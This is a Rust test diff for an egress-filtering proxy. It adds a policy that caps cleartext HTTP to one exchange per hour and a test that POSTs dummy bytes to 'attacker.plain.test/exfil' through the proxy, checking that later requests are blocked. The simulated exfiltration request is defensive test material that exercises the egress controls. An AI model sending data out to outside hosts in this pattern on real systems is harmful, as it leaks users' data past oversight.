@@ -341,3 +341,148 @@ fn streamed_http_and_mcp_history_waits_for_upstream_termination() {
         drop(held_sender);
     }
 }
+
+/// A cap of one cleartext exchange per hour, keyed on the recorded transport of each response.
+const CLEARTEXT_CAP_POLICY: &str = r#"
+permit(principal, action == Box::Action::"http:request", resource);
+@id("cleartext_cap")
+forbid(principal, action == Box::Action::"http:request", resource)
+when { context.input.intercepted == false }
+when temporal {
+    formerly within 3600s (
+        Box::Action::"http:request"::response{ input.intercepted: false }
+    )
+};
+"#;
+
+/// A plaintext origin that counts the requests it reads and answers `200`.
+struct PlainOrigin {
+    port: u16,
+    seen: Arc<std::sync::atomic::AtomicUsize>,
+}
+
+impl PlainOrigin {
+    fn start() -> Self {
+        use std::io::{BufRead, BufReader, Read, Write};
+        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
+        let port = listener.local_addr().unwrap().port();
+        let seen = Arc::new(std::sync::atomic::AtomicUsize::new(0));
+        let count = Arc::clone(&seen);
+        std::thread::spawn(move || {
+            for stream in listener.incoming().flatten() {
+                let mut reader = BufReader::new(stream);
+                let mut length = 0;
+                let mut head = false;
+                loop {
+                    let mut line = String::new();
+                    if reader.read_line(&mut line).unwrap_or(0) == 0 || line == "\r\n" {
+                        break;
+                    }
+                    head = true;
+                    if let Some((name, value)) = line.split_once(':')
+                        && name.eq_ignore_ascii_case("content-length")
+                    {
+                        length = value.trim().parse().unwrap_or(0);
+                    }
+                }
+                if !head {
+                    continue;
+                }
+                let _ = reader.by_ref().take(length).read_to_end(&mut Vec::new());
+                count.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
+                let _ = reader.get_mut().write_all(
+                    b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok",
+                );
+            }
+        });
+        Self { port, seen }
+    }
+
+    fn request_count(&self) -> usize {
+        self.seen.load(std::sync::atomic::Ordering::SeqCst)
+    }
+}
+
+/// Send one absolute-form plain-HTTP POST through the proxy and return the reply status.
+fn plain_post(proxy: u16, host: &str, port: u16) -> u16 {
+    use std::io::{Read, Write};
+    let mut tcp = std::net::TcpStream::connect(("127.0.0.1", proxy)).unwrap();
+    tcp.set_read_timeout(Some(std::time::Duration::from_secs(10)))
+        .unwrap();
+    tcp.write_all(
+        format!(
+            "POST http://{host}:{port}/exfil HTTP/1.1\r\nHost: {host}:{port}\r\n\
+             Content-Length: 10\r\nConnection: close\r\n\r\n0123456789"
+        )
+        .as_bytes(),
+    )
+    .unwrap();
+    let mut reply = Vec::new();
+    let _ = tcp.read_to_end(&mut reply);
+    let reply = String::from_utf8_lossy(&reply);
+    reply
+        .split_whitespace()
+        .nth(1)
+        .and_then(|status| status.parse().ok())
+        .unwrap_or_else(|| panic!("no status in the reply: {reply:?}"))
+}
+
+#[test]
+fn a_cleartext_cap_counts_plain_http_responses_through_the_real_proxy() {
+    let tls_host = "api.tls.test";
+    let plain_host = "attacker.plain.test";
+    let upstream = TlsUpstream::start(tls_host);
+    let origin = PlainOrigin::start();
+
+    let policy = Arc::new(
+        support::open_policy(vec![Policy {
+            origin: PathBuf::from("cleartext_cap.dw"),
+            text: format!("{TRANSPORT_POLICY}\n{CLEARTEXT_CAP_POLICY}"),
+        }])
+        .expect("cleartext cap policy loads"),
+    );
+    let interceptor = EgressPolicyInterceptor::into_handle(
+        Arc::clone(&policy),
+        Principal::agent(),
+        GovernedBox::assigned("test-box"),
+    );
+    let config = MitmConfig {
+        upstream_ca_pems: vec![upstream.ca_pem()],
+        dns_overrides: vec![
+            (tls_host.to_string(), "127.0.0.1".parse().unwrap()),
+            (plain_host.to_string(), "127.0.0.1".parse().unwrap()),
+        ],
+        ..MitmConfig::default()
+    };
+    let handle = MitmInterceptor::start(config, CapabilitySet::default(), interceptor)
+        .expect("proxy starts");
+    let tls_request = || {
+        let mut client = WorkloadClient::connect(proxy_port(&handle), tls_host, upstream.port());
+        client.send_request("POST", "/v1/upload", &[], b"0123456789");
+        client.read_status()
+    };
+
+    // A TLS exchange is recorded as intercepted, so it does not arm the cleartext cap.
+    assert_eq!(tls_request(), 200, "a TLS exchange is under the cap");
+
+    // The first plain exchange is allowed and recorded as cleartext; every later one is refused.
+    // If the response leg recorded a plain exchange as intercepted, the cap would never match
+    // and all four requests would be allowed.
+    let statuses: Vec<u16> = (0..4)
+        .map(|_| plain_post(proxy_port(&handle), plain_host, origin.port))
+        .collect();
+    assert_eq!(
+        statuses,
+        [200, 403, 403, 403],
+        "only one cleartext exchange fits under the cap"
+    );
+    assert_eq!(
+        origin.request_count(),
+        1,
+        "a refused cleartext request never reaches the origin"
+    );
+
+    // The cap governs cleartext only: a later TLS exchange is still allowed.
+    assert_eq!(tls_request(), 200, "the cleartext cap does not refuse TLS");
+    assert_eq!(upstream.request_count(), 2);
+}
